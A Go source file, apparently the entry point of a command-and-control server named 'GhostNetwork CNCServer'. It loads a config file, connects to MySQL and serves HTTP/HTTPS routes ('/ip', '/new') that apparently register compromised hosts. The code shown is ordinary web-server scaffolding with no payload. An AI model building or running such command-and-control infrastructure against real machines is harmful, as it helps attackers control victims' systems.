package main

import (
	"log"

	"net/http"
	"github.com/gorilla/mux"

	"github.com/bienkma/GhostNetwork/CNCServer/handler"
	"github.com/bienkma/GhostNetwork/CNCServer/configuration"
	"github.com/bienkma/GhostNetwork/CNCServer/database"
)

// Create Ghost CNCServer, it supports http or https protocol
func GhostServer() {
	// Read config file
	CNCConf := configuration.CNCConf()

	dbconfig := database.MySqlConfig{
		Host:          CNCConf.DBAddress,
		Port:          CNCConf.DBPort,
		DbName:        CNCConf.DBName,
		DBUsername:    CNCConf.DBUsername,
		Password:      CNCConf.DBPassword,
		LogEnable:     CNCConf.DBLogMode,
		MaxConnection: CNCConf.DBMaxConnection,
	}

	db := database.OpenMySQL(dbconfig)
	defer db.Close()

	// Load config into GhostServer
	database.Builder(db, &CNCConf)

	router := mux.NewRouter()
	router.Use(handler.LoggingMiddleware)

	router.HandleFunc("/", handler.IndexHandler)
	router.HandleFunc("/ip", handler.IPHandler)
	router.HandleFunc("/new", handler.New)
	http.Handle("/", router)

	if CNCConf.UseSSL != false {
		if err := http.ListenAndServeTLS(":"+CNCConf.CNCPort, CNCConf.SSLCert, CNCConf.SSLKey, nil); err != nil {
			log.Fatal(err)
		}
	}
	if err := http.ListenAndServe(CNCConf.CNCAddress+":"+CNCConf.CNCPort, nil); err != nil {
		log.Fatal(err)
	}
}

func main() {
	GhostServer()
}
